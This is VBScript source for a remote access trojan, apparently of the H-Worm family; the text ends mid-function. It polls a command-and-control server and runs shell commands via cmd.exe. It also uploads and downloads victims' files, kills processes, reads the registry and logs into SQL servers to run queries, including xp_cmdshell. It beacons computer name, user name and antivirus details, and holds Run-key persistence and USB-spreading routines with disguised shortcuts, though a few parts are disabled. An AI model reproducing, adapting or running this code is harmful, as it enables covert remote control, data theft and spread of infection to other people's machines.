
'=-=-=-=-= config =-=-=-=-=-=-=-=-=-=-=-=-=-=-=
host = "127.0.0.1"
port = 81
installdir = "%temp%"
lnkfile = false
lnkfolder = false
'=-=-=-=-= public var =-=-=-=-=-=-=-=-=-=-=-=-=
dim DJB 
dim shellobj 
set shellobj = wscript.createobject("wscript.shell")
dim filesystemobj
set filesystemobj = createobject("scripting.filesystemobject")
dim httpobj
set httpobj = createobject("msxml2.xmlhttp")
'=-=-=-=-= privat var =-=-=-=-=-=-=-=-=-=-=-=
installname = wscript.scriptname
startup = shellobj.specialfolders ("startup") & "\"
installdir = shellobj.expandenvironmentstrings(installdir) & "\"
if not filesystemobj.folderexists(installdir) then  installdir = shellobj.expandenvironmentstrings("%temp%") & "\"
spliter = "qiQqi"
sleep = 250 
dim response
dim cmd
dim param
dim Columns_line
info = ""
usbspreading = "False"
startdate = ""
dim oneonce
dim reg_key1
dim row_count
'=-=-=-=-= code start =-=-=-=-=-=-=-=-=-=-=-=
 on error resume next
'instance
while true
 on error resume next
'install
response = ""
response = post ("ready","")
cmd = split (response,spliter)
select case cmd (0)
case "exc"
      param = cmd (1)
	  MsgBox "For Saftey"
     ' execute param
case "uns"
      uninstall
case  "sleep"
      param = cmd (1)
      sleep = eval (param)  
case  "msg"
	  param = cmd (1)
	  MsgBox param
case "open_fm"
	 response = post ("open_fm","open_fm" & spliter)
case "fm_drives"
	 response = post ("fm_drives","fm_drives" & spliter & enumdriver() & spliter)
case "fm_browse"
	dim All_faf
	dim dir_req
	dir_req =  cmd (1)
	All_faf = enumfaf (dir_req)
	 response = post ("fm_browse","fm_browse" & spliter & All_faf & spliter)
case "open_proc"
	 response = post ("open_proc","open_proc" & spliter)
case "get_proc"
	dim All_proc
	All_proc = enumprocess()
	 response = post ("get_proc","get_proc" & spliter & All_proc & spliter)
case "kill_pro"  
	param = cmd(1)
    exitprocess param
case "open_cmd"
	response = post ("open_cmd","open_cmd" & spliter & cmdshell("") & spliter)
case "prc_cmd"
	param = cmd(1)
	dim res_cmd
	res_cmd = cmdshell(param)
	response = post ("resp_cmd","resp_cmd" & spliter & res_cmd & spliter)
case "open_reg"
	 response = post ("open_reg","open_reg" & spliter)
case "get_reg"
	dim All_reg
	dim reg_Main
	dim ky_PH
	reg_Main =  cmd (1)
	ky_PH =   cmd (2)
	 All_reg = GET_KEys(reg_Main,ky_PH)
	 response = post ("get_reg","get_reg" & spliter & All_reg & spliter )
case "run_fil"
		dim Val_file
		param = cmd(1)
		   Dim shl  
		Set shl = CreateObject("Wscript.Shell")  
		Val_file = param 
		Call shl.Run(""""& Val_file & """")  
        Set shl = Nothing    
case "sen_me_fil"
		
		param = cmd(1)
		dim file_nme
		file_nme = cmd(2)
		dim Val_UP
		Val_UP = ReadBinaryFile (param)
		 
		 response = post ("dwn_this" & spliter & file_nme & spliter, Val_UP )
		
case "sendfileto"
	   dim write_file_to 
	   write_file_to = cmd(1) 'Dir to write file to with filename "Dir\file.ext"
	   dim write_content
	   write_content = cmd(2)
	   dim Val_DW
	   dim fil_cont_w
	   fil_cont_w = decodeBase64 (write_content)
	   Val_DW = SaveBinaryData (write_file_to,fil_cont_w)
	   
	   
case "del_file"
		dim del_file_fro 
	   del_file_fro = cmd(1)
	   deletefaf del_file_fro
case "ren_file"
	   dim ren_file_fro 
	   ren_file_fro = cmd(1)
	   dim new_name_file
	   new_name_file = cmd(2)
	   rename_filefaf ren_file_fro,new_name_file
	   
case "ren_folder"
	   dim ren_folder_fro 
	   ren_folder_fro = cmd(1)
	   dim new_name_folder
	   new_name_folder = cmd(2)
	   rename_folderfaf ren_folder_fro,new_name_folder 
	   
case "create_fold"
		 dim cre_folder_fro 
	   cre_folder_fro = cmd(1)
	   Create_folde cre_folder_fro
case "open_lan_enum" 
		
	   response = post ("open_lan_enum","open_lan_enum" & spliter)	   		
 
 case "get_local_enum" 
		 local_net_comp_ips = getLocal_ip_in_lan
		response = post ("get_local_enum","get_local_enum" & spliter & local_net_comp_ips & spliter)
	 	   		
 
case "open_Sql_login" 
		
	   response = post ("open_Sql_login","open_Sql_login" & spliter)

case "do_wind_auth_login" 
		 
		dim dbsx
		dbsx = cmd(3)
		Sql_con_string = "Provider=SQLOLEDB.1;Data Source=" & dbsx & ";Integrated Security=SSPI;Trusted_Connection=yes;"
	    sql_login_status = TestODBC(Sql_con_string)
		response = post ("sql_login_stat","sql_login_stat" & spliter & sql_login_status & spliter & Sql_con_string & spliter)
	   
case "do_Sql_login" 
		dim uid
		uid = cmd(1)
		dim pwd
		pwd = cmd(2)
		dim dbs
		dbs = cmd(3)
		Sql_con_string = "Provider=SQLOLEDB.1;Data Source=" & dbs & ";user id ='" & uid & "';password='" & pwd & "'"
	    sql_login_status = TestODBC(Sql_con_string)
		response = post ("sql_login_stat","sql_login_stat" & spliter & sql_login_status & spliter & Sql_con_string & spliter)

	
case "dosqlqueryordselect"

	dim Sql_query_str_ord
	Sql_query_str_ord = cmd(1)
	dim Sql_con_st_ord
	Sql_con_st_ord = cmd(2)
	Columns_line = ""
	row_count = -1
	if instr(Sql_query_str_ord,"Update") or instr(Sql_query_str_ord,"Delete") or instr(Sql_query_str_ord,"Insert") then 
	Get_Query_result Sql_query_str_ord,Sql_con_st_ord 
	response = post ("ordselect_ref","ordselect_ref" & spliter )
		response = post ("sql_query","sql_query" & spliter )
	elseif instr(Sql_query_str_ord,"SELECT") then 
	sql_run_stat = Test_No_error (Sql_query_str_ord,Sql_con_st_ord)'"success"
	if instr(sql_run_stat,"uccess") then 
		if instr(sql_run_stat,"s") then 
		Get_Query_result_columns Sql_query_str_ord,Sql_con_st_ord 
		response = post ("creSQLcol","creSQLcol" & spliter & Columns_line & spliter & row_count & spliter)
		Get_Query_result Sql_query_str_ord,Sql_con_st_ord 
		end if 
	else 
	response = post ("Sql_error","Sql_error" & spliter & sql_run_stat & spliter )
	end if 
	elseif instr(Sql_query_str_ord,"xp_cmdshell") then 
	sql_run_stat = Test_No_error (Sql_query_str_ord,Sql_con_st_ord)'"success"
	if instr(sql_run_stat,"uccess") then 
		if instr(sql_run_stat,"s") then 
		Get_Query_result_columns Sql_query_str_ord,Sql_con_st_ord 
		response = post ("creSQLcol","creSQLcol" & spliter & Columns_line & spliter & row_count & spliter)
		Get_Query_result Sql_query_str_ord,Sql_con_st_ord 
		end if 
	else 
	response = post ("Sql_error","Sql_error" & spliter & sql_run_stat & spliter )
	end if 

	end if 
	
	'ordselect_ref
 
	'Get_Query_result
case "dosqlquerygetdatabases"
dim Sql_query_str_dbs
dim Sql_con_st_dbs
	Sql_query_str_dbs = cmd(1)
	Sql_con_st_dbs = cmd(2)
	   sql_dbs_res = Get_databases(Sql_con_st_dbs)
	   response = post ("dosqlquery","dosqlquery" & spliter & "getdatabases" & spliter & sql_dbs_res & spliter)
	'Get_databases
case "dosqlquerygettables"
dim Sql_query_str_tbls
dim Sql_con_st_tbls
dim Sql_query_str_tbls_dbname
	Sql_query_str_tbls = cmd(1)
	Sql_con_st_tbls = cmd(2)
	Sql_query_str_tbls_dbname = cmd(3)
	  sql_tbls_res = Get_tables(Sql_query_str_tbls,Sql_con_st_tbls)
	   response = post ("dosqlquery","dosqlquery" & spliter & "gettables" & spliter & sql_tbls_res & spliter & Sql_query_str_tbls_dbname & spliter)

case "dosqlquerygetviews"
dim Sql_query_str_vws
dim Sql_con_st_vws
dim Sql_query_str_vws_dbname
	Sql_query_str_vws = cmd(1)
	Sql_con_st_vws = cmd(2)	
	Sql_query_str_vws_dbname = cmd(3)
	sql_vws_res = Get_views(Sql_query_str_vws,Sql_con_st_vws)
response = post ("dosqlquery","dosqlquery" & spliter & "getviews" & spliter & sql_vws_res & spliter & Sql_query_str_vws_dbname & spliter)
case "linked_svrs"
	dim Sql_query_lnked
	dim Sql_con_st_lnked
	Sql_query_lnked = cmd(1)
	Sql_con_st_lnked= cmd(2)	
	sql_lnked_res = Get_linked_svrs(Sql_query_lnked,Sql_con_st_lnked)
	response = post ("dosqlquery","dosqlquery" & spliter & "linked_svrs" & spliter & sql_lnked_res & spliter & "" & spliter )
end select
wscript.sleep sleep
wend

function Get_linked_svrs(SQL_QUEY,Conn_string)
on error resume next 
dim All_lnked
Set obj = createobject("ADODB.Connection") 'Creating an ADODB Connection Object
Set obj1 = createobject("ADODB.RecordSet") 'Creating an ADODB Recordset Object
Dim dbquery       'Declaring a database query variable bquery 
Dbquery= SQL_QUEY  
obj.Open  Conn_string'"Provider=SQLOLEDB.1;Data Source=192.168.1.9;user id ='sa';password=''"    'Opening a Connection    
obj1.Open dbquery,obj   'Executing the query using recordset  
While NOT obj1.EOF
    ' Loop through each field
    For Each field In obj1.Fields
	
	All_lnked = All_lnked & field.Value   & "lnked_splt"   
   '  output.Write field.Value & " "
    next
    obj1.MoveNext
   ' output.WriteLine
Wend

obj.close                             'Closing the connection object
obj1.close                      'Closing the connection object
Set obj1=Nothing              'Releasing Recordset object
Set obj=Nothing                'Releasing Connection object
Get_linked_svrs = All_lnked  & "lnked_splt"   & "sql_lnked_end"
end function 

Function getLocal_ip_in_lan()
On Error Resume Next
getLocal_ip_in_lan = ""
strQuery = "SELECT * FROM Win32_NetworkAdapterConfiguration WHERE MACAddress > ''"

Set objWMIService = GetObject( "winmgmts://./root/CIMV2" )
Set colItems      = objWMIService.ExecQuery( strQuery, "WQL", 48 )

For Each objItem In colItems
    If IsArray( objItem.IPAddress ) Then
        If UBound( objItem.IPAddress ) = 0 Then
            strIP = "IP Address: " & objItem.IPAddress(0)
        Else
            strIP = "IP Addresses: " & Join( objItem.IPAddress, "ip_splt_i" )
        End If
    End If
Next

	
 getLocal_ip_in_lan =strIP
End Function

function Get_databases(Conn_string)
on error resume next 
dim All_databases
Set obj = createobject("ADODB.Connection") 'Creating an ADODB Connection Object
Set obj1 = createobject("ADODB.RecordSet") 'Creating an ADODB Recordset Object
Dim dbquery       'Declaring a database query variable bquery 
Dbquery="SELECT name FROM sys.databases"'Creating a query  "Provider=Microsoft.ACE.OLEDB.12.0" SQLQLEDB
obj.Open  Conn_string'"Provider=SQLOLEDB.1;Data Source=192.168.1.9;user id ='sa';password=''"    'Opening a Connection    
obj1.Open dbquery,obj   'Executing the query using recordset  
While NOT obj1.EOF
    ' Loop through each field
    For Each field In obj1.Fields
	All_databases = All_databases & field.Value   & "db_splt"   
   '  output.Write field.Value & " "
    next
    obj1.MoveNext
   ' output.WriteLine
Wend
obj.close                             'Closing the connection object
obj1.close                      'Closing the connection object
Set obj1=Nothing              'Releasing Recordset object
Set obj=Nothing                'Releasing Connection object
Get_databases = All_databases
end function 

function Get_tables(SQL_QUEY,Conn_string)
on error resume next 
dim All_tables
Set obj = createobject("ADODB.Connection") 'Creating an ADODB Connection Object
Set obj1 = createobject("ADODB.RecordSet") 'Creating an ADODB Recordset Object
Dim dbquery       'Declaring a database query variable bquery 
Dbquery= SQL_QUEY  
obj.Open  Conn_string'"Provider=SQLOLEDB.1;Data Source=192.168.1.9;user id ='sa';password=''"    'Opening a Connection    
obj1.Open dbquery,obj   'Executing the query using recordset  
While NOT obj1.EOF
    ' Loop through each field
    For Each field In obj1.Fields
	
	All_tables = All_tables & field.Value   & "table_splt"   
   '  output.Write field.Value & " "
    next
    obj1.MoveNext
   ' output.WriteLine
Wend

obj.close                             'Closing the connection object
obj1.close                      'Closing the connection object
Set obj1=Nothing              'Releasing Recordset object
Set obj=Nothing                'Releasing Connection object
Get_tables = All_tables  & "table_splt"   & "sql_rtables_end"
end function 
function Get_views(SQL_QUEY,Conn_string)
on error resume next 
dim All_views
Set obj = createobject("ADODB.Connection") 'Creating an ADODB Connection Object
Set obj1 = createobject("ADODB.RecordSet") 'Creating an ADODB Recordset Object
Dim dbquery       'Declaring a database query variable bquery 
Dbquery=  SQL_QUEY 
obj.Open  Conn_string'"Provider=SQLOLEDB.1;Data Source=192.168.1.9;user id ='sa';password=''"    'Opening a Connection    
obj1.Open dbquery,obj   'Executing the query using recordset  
While NOT obj1.EOF
    ' Loop through each field
    For Each field In obj1.Fields
	All_views = All_views & field.Value   & "view_splt"   
   '  output.Write field.Value & " "
    next
    obj1.MoveNext
   ' output.WriteLine
Wend
obj.close                             'Closing the connection object
obj1.close                      'Closing the connection object
Set obj1=Nothing              'Releasing Recordset object
Set obj=Nothing                'Releasing Connection object
Get_views = All_views & "view_splt" & "sql_rtables_end"
end function 
function Get_Query_result_columns(query_sql,Conn_string)
on error resume next 
Set obj = createobject("ADODB.Connection") 'Creating an ADODB Connection Object
Set obj1 = createobject("ADODB.RecordSet") 'Creating an ADODB Recordset Object
Dim dbquery       'Declaring a database query variable bquery 
Dbquery= query_sql
obj.Open  Conn_string'"Provider=SQLOLEDB.1;Data Source=192.168.1.9;user id ='sa';password=''"    'Opening a Connection    
obj1.Open dbquery,obj   'Executing the query using recordset  

For intColIndex = 0 To obj1.Fields.Count - 1 
   Columns_line = Columns_line & obj1.Fields(intColIndex).Name & "col_splt"
Next
While NOT obj1.EOF
	 row_count = row_count + 1
	 obj1.MoveNext
Wend
Columns_line = Columns_line & "col_end"
end function 
sub Get_Query_result(query_sql,Conn_string)
on error resume next 
Set obj = createobject("ADODB.Connection") 'Creating an ADODB Connection Object
Set obj1 = createobject("ADODB.RecordSet") 'Creating an ADODB Recordset Object
Dim dbquery       'Declaring a database query variable bquery 
Dbquery= query_sql

if instr(Dbquery,"Update") or instr(Dbquery,"Delete") or instr(Dbquery,"Insert") then 
obj.Open  Conn_string'"Provider=SQLOLEDB.1;Data Source=192.168.1.9;user id ='sa';password=''"    'Opening a Connection    
obj1.Open dbquery,obj   'Executing the query using recordset  
dim httpobj2
set httpobj2 = createobject("msxml2.xmlhttp")	  
httpobj2.open "POST","http://" & host & ":" & port &"/" & "ordselect_ref", false
httpobj2.setrequestheader "User-Agent:",information
httpobj2.send "ordselect_ref" & spliter & fields_result & spliter
 
return


elseif instr(Dbquery,"SELECT") then 


obj.Open  Conn_string'"Provider=SQLOLEDB.1;Data Source=192.168.1.9;user id ='sa';password=''"    'Opening a Connection    
obj1.Open dbquery,obj   'Executing the query using recordset  
rows_count_i = -1
cols_count_j = -1
rows_count_other = obj1.Fields.Count - 1
While NOT obj1.EOF
cols_count_j = -1
	rows_count_i =rows_count_i+1
	dim fields_result
	fields_result = ""
	For Each field In obj1.Fields
	cols_count_j = cols_count_j + 1
	fields_result = fields_result & "" & field.Value   & "#!#"  & rows_count_i & "#!#" & cols_count_j  & "#!#" & "field_splt"
    next
fields_result = fields_result &  "field_end"
dim httpobj3
set httpobj3 = createobject("msxml2.xmlhttp")	  
httpobj3.open "POST","http://" & host & ":" & port &"/" & "ord_sql_cell", false
httpobj3.setrequestheader "User-Agent:",information
httpobj3.send "ord_sql_cell" & spliter & fields_result & spliter
 
    obj1.MoveNext
Wend
obj1.close
obj.close                            
Set obj1=Nothing
Set obj=Nothing    
 
       
end if 




end sub
Function Test_No_error(SQL_Qru,Conn_string)

On Error GoTo 0
	Test_No_error = ""
    Set DB = CreateObject("ADODB.Connection")
    DB.Open Conn_string
    If Err then
      '  MsgBox "Error: " & Err.Number & " - " & Err.Description
        Test_No_error = Err.Description
    Else
        SQL = SQL_Qru
        Set RS = DB.Execute(SQL)
        If Err then
           ' MsgBox "Error: " & Err.Number & " - " & Err.Description
            Test_No_error = Err.Description
			Else
			Test_No_error = "success"
        End If
    End if

End Function
Function TestODBC(Conn_string)

On Error Resume Next
	TestODBC = ""
    Set DB = CreateObject("ADODB.Connection")
    DB.Open Conn_string
    If Err then
      '  MsgBox "Error: " & Err.Number & " - " & Err.Description
        TestODBC = Err.Description
    Else
        SQL = "SELECT name FROM sys.databases"
        Set RS = DB.Execute(SQL)
        If Err then
           ' MsgBox "Error: " & Err.Number & " - " & Err.Description
            TestODBC = Err.Description
			Else
			TestODBC = "login_success"
        End If
    End if

End Function


sub Create_folde(folde_nam1)
 On Error Resume Next
filesystemobj.CreateFolder folde_nam1
end sub 
Sub rename_folderfaf(folder_n1 , folder_n2 )
 On Error Resume Next
	filesystemobj.MoveFolder folder_n1 , folder_n2
End Sub
Sub rename_filefaf(file_n1 , file_n2 )
    On Error Resume Next
    filesystemobj.MoveFile file_n1 , file_n2
End Sub
Sub deletefaf(file_ur)
        On Error Resume Next
		filesystemobj.deletefile(file_ur)
        filesystemobj.deletefolder(file_ur)

End Sub
private function decodeBase64(base64)
  dim DM, EL
  Set DM = CreateObject("Microsoft.XMLDOM")
  ' Create temporary node with Base64 data type
  Set EL = DM.createElement("tmp")
  EL.DataType = "bin.base64"
  ' Set encoded String, get bytes
  EL.Text = base64
  decodeBase64 = EL.NodeTypedValue
end function
 
Function SaveBinaryData(FileName, ByteArray)
  Const adTypeBinary = 1
  Const adSaveCreateOverWrite = 2
  
  'Create Stream object
  Dim BinaryStream
  Set BinaryStream = CreateObject("ADODB.Stream")
  
  'Specify stream type - we want To save binary data.
  BinaryStream.Type = adTypeBinary
  
  'Open the stream And write binary data To the object
  BinaryStream.Open
  BinaryStream.Write ByteArray
  
  'Save binary data To disk
  BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
End Function

Function ReadBinaryFile(FileName)
  Const adTypeBinary = 1
  
  'Create Stream object
  Dim BinaryStream
  Set BinaryStream = CreateObject("ADODB.Stream")
  
  'Specify stream type - we want To get binary data.
  BinaryStream.Type = adTypeBinary
  
  'Open the stream
  BinaryStream.Open
  
  'Load the file data from disk To stream object
  BinaryStream.LoadFromFile FileName
  
  'Open the stream And get binary data from the object
  ReadBinaryFile = BinaryStream.Read
End Function
Function upload(fileurl)

        Dim objstreamuploade, buffer
        objstreamuploade = CreateObject("adodb.stream")
        With objstreamuploade
            .type = 1
            .open()
            .loadfromfile(fileurl)
            buffer = .read
            .close()
        End With
        objstreamdownload = Nothing
		 
		'dim httpobj
        'httpobj = CreateObject("msxml2.xmlhttp")
        'httpobj.open "post", "http://" & host & ":" & port & "/" & "is-recving" & spliter & fileurl, false
		'httpobj.send "dwn_this"& spliter & buffer
		upload = buffer
End Function







Function cmdshell(cmd_com)

Dim ObjExec
Dim strFromProc
 
Set objShell = WScript.CreateObject("WScript.Shell")
Set ObjExec = objShell.Exec("cmd.exe /c " & cmd_com)
Do
    strFromProc = strFromProc & vbCrLf  & ObjExec.StdOut.ReadLine()
Loop While Not ObjExec.Stdout.atEndOfStream

        cmdshell = strFromProc
		
    End Function



function Read_Reg_V(reg_read)
reg_read = Replace(reg_read,"\\","\")
Set objShell = WScript.CreateObject("WScript.Shell")
Read_Reg_V = objShell.RegRead(reg_read) 
end function
function ADD_KEY(reg_key,key_path_entry)
 on error resume next
dim strComputer
dim All_KS
dim ALL_VLS
Const HKEY_CLASSES_ROOT = &H80000000
Const HKEY_CURRENT_USER = &H80000001
Const HKEY_LOCAL_MACHINE = &H80000002
Const HKEY_USERS = &H80000003
Const HKEY_CURRENT_CONFIG = &H80000005

dim Key_INT32 
select case reg_key
	case "HKEY_CLASSES_ROOT"
	Key_INT32 = HKEY_CLASSES_ROOT
	case "HKEY_CURRENT_USER"
	Key_INT32 = HKEY_CURRENT_USER
	case "HKEY_LOCAL_MACHINE"
	Key_INT32 = HKEY_LOCAL_MACHINE
	case "HKEY_USERS"
	Key_INT32 = HKEY_USERS
	case "HKEY_CURRENT_CONFIG"
	Key_INT32 = HKEY_CURRENT_CONFIG
end select
strComputer = "."
Set objReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" _ 
    & strComputer & "\root\default:StdRegProv")
strKeyPath = key_path_entry
objReg.CreateKey Key_INT32,strKeyPath
end function 
function Delete_KEY(reg_key,key_path_entry)
 on error resume next
dim strComputer
dim All_KS
dim ALL_VLS
Const HKEY_CLASSES_ROOT = &H80000000
Const HKEY_CURRENT_USER = &H80000001
Const HKEY_LOCAL_MACHINE = &H80000002
Const HKEY_USERS = &H80000003
Const HKEY_CURRENT_CONFIG = &H80000005

dim Key_INT32 
select case reg_key
	case "HKEY_CLASSES_ROOT"
	Key_INT32 = HKEY_CLASSES_ROOT
	case "HKEY_CURRENT_USER"
	Key_INT32 = HKEY_CURRENT_USER
	case "HKEY_LOCAL_MACHINE"
	Key_INT32 = HKEY_LOCAL_MACHINE
	case "HKEY_USERS"
	Key_INT32 = HKEY_USERS
	case "HKEY_CURRENT_CONFIG"
	Key_INT32 = HKEY_CURRENT_CONFIG
end select
strComputer = "."
Set objReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" _ 
    & strComputer & "\root\default:StdRegProv")
strKeyPath = key_path_entry
objReg.DeleteKey  Key_INT32,strKeyPath
end function 

function GET_KEys(reg_key,key_path_entry)
 on error resume next
dim strComputer
dim All_KS
dim ALL_VLS
Const HKEY_CLASSES_ROOT = &H80000000
Const HKEY_CURRENT_USER = &H80000001
Const HKEY_LOCAL_MACHINE = &H80000002
Const HKEY_USERS = &H80000003
Const HKEY_CURRENT_CONFIG = &H80000005

dim Key_INT32 
select case reg_key
	case "HKEY_CLASSES_ROOT"
	Key_INT32 = HKEY_CLASSES_ROOT
	case "HKEY_CURRENT_USER"
	Key_INT32 = HKEY_CURRENT_USER
	case "HKEY_LOCAL_MACHINE"
	Key_INT32 = HKEY_LOCAL_MACHINE
	case "HKEY_USERS"
	Key_INT32 = HKEY_USERS
	case "HKEY_CURRENT_CONFIG"
	Key_INT32 = HKEY_CURRENT_CONFIG
end select
strComputer = "."

Set objReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" _ 
    & strComputer & "\root\default:StdRegProv")

strKeyPath = key_path_entry

objReg.EnumKey Key_INT32, strKeyPath, arrSubKeys

For Each subkey In arrSubKeys
	All_KS = All_KS & subkey & "|l_ln|"
	objReg.EnumValues Key_INT32, strKeyPath , sNames , Types
	Dim i 
	i = 0
	For each xx in sNames
		dim full_ke_path 
		full_ke_path = reg_key & "\" &  key_path_entry  & "\" & xx
		dim Val_read
		Val_read = Read_Reg_V(full_ke_path)
		If Val_read <> "" Then 
		'String is Not Null And Not Empty, code goes here
		Else
		
		End If
		ALL_VLS = ALL_VLS & xx  &   "#$"   &  Types(i) &   "#$"   & Val_read & "|vsl_n|"
			  
	i = i + 1
	Next 
		 
Next
GET_KEys = All_KS  & "R#_$PL"  & ALL_VLS & "R#_$PL" 
end function

sub install
exit sub 
on error resume next
dim lnkobj
dim filename
dim foldername
dim fileicon
dim foldericon
upstart
for each drive in filesystemobj.drives
if  drive.isready = true then
if  drive.freespace  > 0 then
if  drive.drivetype  = 1 then
    filesystemobj.copyfile wscript.scriptfullname , drive.path & "\" & installname,true
    if  filesystemobj.fileexists (drive.path & "\" & installname)  then
        filesystemobj.getfile(drive.path & "\"  & installname).attributes = 2+4
    end if
    for each file in filesystemobj.getfolder( drive.path & "\" ).Files
        if not lnkfile then exit for
        if  instr (file.name,".") then
            if  lcase (split(file.name, ".") (ubound(split(file.name, ".")))) <> "lnk" then
                file.attributes = 2+4
                if  ucase (file.name) <> ucase (installname) then
                    filename = split(file.name,".")
                    set lnkobj = shellobj.createshortcut (drive.path & "\"  & filename (0) & ".lnk") 
                    lnkobj.windowstyle = 7
                    lnkobj.targetpath = "cmd.exe"
                    lnkobj.workingdirectory = ""
                    lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start " & replace(file.name," ", chrw(34) & " " & chrw(34)) &"&exit"
                    fileicon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\" & shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\." & split(file.name, ".")(ubound(split(file.name, ".")))& "\") & "\defaulticon\") 
                    if  instr (fileicon,",") = 0 then
                        lnkobj.iconlocation = file.path
                    else 
                        lnkobj.iconlocation = fileicon
                    end if
                    lnkobj.save()
                end if
            end if
        end if
    next
    for each folder in filesystemobj.getfolder( drive.path & "\" ).subfolders
        if not lnkfolder then exit for
        folder.attributes = 2+4
        foldername = folder.name
        set lnkobj = shellobj.createshortcut (drive.path & "\"  & foldername & ".lnk") 
        lnkobj.windowstyle = 7
        lnkobj.targetpath = "cmd.exe"
        lnkobj.workingdirectory = ""
        lnkobj.arguments = "/c start " & replace(installname," ", chrw(34) & " " & chrw(34)) & "&start explorer " & replace(folder.name," ", chrw(34) & " " & chrw(34)) &"&exit"
        foldericon = shellobj.regread ("HKEY_LOCAL_MACHINE\software\classes\folder\defaulticon\") 
        if  instr (foldericon,",") = 0 then
            lnkobj.iconlocation = folder.path
        else 
            lnkobj.iconlocation = foldericon
        end if
        lnkobj.save()
    next
end If
end If
end if
next
err.clear
end sub
sub uninstall
wscript.quit
on error resume next
dim filename
dim foldername
shellobj.regdelete "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split (installname,".")(0)
shellobj.regdelete "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & split (installname,".")(0)
filesystemobj.deletefile startup & installname ,true
filesystemobj.deletefile wscript.scriptfullname ,true
for  each drive in filesystemobj.drives
if  drive.isready = true then
if  drive.freespace  > 0 then
if  drive.drivetype  = 1 then
    for  each file in filesystemobj.getfolder ( drive.path & "\").files
         on error resume next
         if  instr (file.name,".") then
             if  lcase (split(file.name, ".")(ubound(split(file.name, ".")))) <> "lnk" then
                 file.attributes = 0
                 if  ucase (file.name) <> ucase (installname) then
                     filename = split(file.name,".")
                     filesystemobj.deletefile (drive.path & "\" & filename(0) & ".lnk" )
                 else
                     filesystemobj.deletefile (drive.path & "\" & file.name)
                 end If
             else
                 filesystemobj.deletefile (file.path) 
             end if
         end if
     next
     for each folder in filesystemobj.getfolder( drive.path & "\" ).subfolders
         folder.attributes = 0
     next
end if
end if
end if
next
wscript.quit
end sub
function post (cmd ,param)
post = param
httpobj.open "POST","http://" & host & ":" & port &"/" & cmd, false
httpobj.setrequestheader "User-Agent:",information
httpobj.send param
post = httpobj.responsetext
end function
function information
on error resume next
if  inf = "" then
    inf = hwid & spliter 
    inf = inf  & shellobj.expandenvironmentstrings("%computername%") & spliter 
    inf = inf  & shellobj.expandenvironmentstrings("%username%") & spliter
    set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
    set os = root.execquery ("select * from win32_operatingsystem")
    for each osinfo in os
       inf = inf & osinfo.caption & spliter  
       exit for
    next
    inf = inf & spliter & "0.1" & spliter & security & spliter & usbspreading & spliter
    information = inf  
else
    information = inf
end if
end function
sub upstart ()
on error resume Next
shellobj.regwrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split (installname,".")(0),  "wscript.exe //B " & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"
shellobj.regwrite "HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\" & split (installname,".")(0),  "wscript.exe //B "  & chrw(34) & installdir & installname & chrw(34) , "REG_SZ"
filesystemobj.copyfile wscript.scriptfullname,installdir & installname,true
filesystemobj.copyfile wscript.scriptfullname,startup & installname ,true
end sub
function hwid
on error resume next
set root = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
set disks = root.execquery ("select * from win32_logicaldisk")
for each disk in disks
    if  disk.volumeserialnumber <> "" then
        hwid = disk.volumeserialnumber
        exit for
    end if
next
end function
function security 
on error resume next
security = ""
set objwmiservice = getobject("winmgmts:{impersonationlevel=impersonate}!\\.\root\cimv2")
set colitems = objwmiservice.execquery("select * from win32_operatingsystem",,48)
for each objitem in colitems
    versionstr = split (objitem.version,".")
next
versionstr = split (colitems.version,".")
osversion = versionstr (0) & "."
for  x = 1 to ubound (versionstr)
	 osversion = osversion &  versionstr (i)
next
osversion = eval (osversion)
if  osversion > 6 then sc = "securitycenter2" else sc = "securitycenter"
set objsecuritycenter = getobject("winmgmts:\\localhost\root\" & sc)
Set colantivirus = objsecuritycenter.execquery("select * from antivirusproduct","wql",0)
for each objantivirus in colantivirus
    security  = security  & objantivirus.displayname & " ."
next
if security  = "" then security  = "NAN/AV"
end function
function instance
on error resume next
usbspreading = shellobj.regread ("HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0) & "\")
if usbspreading = "" then
   if lcase ( mid(wscript.scriptfullname,2)) = ":\" &  lcase(installname) then
      usbspreading = "YES - " & date
      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0)  & "\",  usbspreading, "REG_SZ"
   else
      usbspreading = "NO - " & date
      shellobj.regwrite "HKEY_LOCAL_MACHINE\software\" & split (installname,".")(0)  & "\",  usbspreading, "REG_SZ"
   end if
end If
upstart
set scriptfullnameshort =  filesystemobj.getfile (wscript.scriptfullname)
set installfullnameshort =  filesystemobj.getfile (installdir & installname)
if  lcase (scriptfullnameshort.shortpath) <> lcase (installfullnameshort.shortpath) then 
    shellobj.run "wscript.exe //B " & chr(34) & installdir & installname & Chr(34)
    wscript.quit 
end If
err.clear
set oneonce = filesystemobj.opentextfile (installdir & installname ,8, false)
if  err.number > 0 then wscript.quit
end function
 Function enumdriver()

        For Each drive In filesystemobj.drives
            enumdriver = enumdriver & drive.path & "|" & drive.drivetype & "drv_split"
           Next
    End Function
	
    Function enumfaf(enumdir)
	dim AllFolders
	dim AllFiles
        'enumfaf = enumdir & "gfm_split"
        For Each folder In filesystemobj.getfolder(enumdir).subfolders
            AllFolders = AllFolders & folder.name & "#!#" & "N/A" & "#!#" & "dir" &  "gfm_split"
        Next

        For Each file In filesystemobj.getfolder(enumdir).files
            AllFiles = AllFiles & file.name & "#!#" & file.size & "#!#" & "fil" &  "gfm_split"

        Next
		enumfaf = AllFolders  & AllFiles  
    End Function
 Function enumprocess()
on error resume next
	 
Dim objWMIService, objProcess, colProcess
Dim strComputer, strList

strComputer = "."

Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

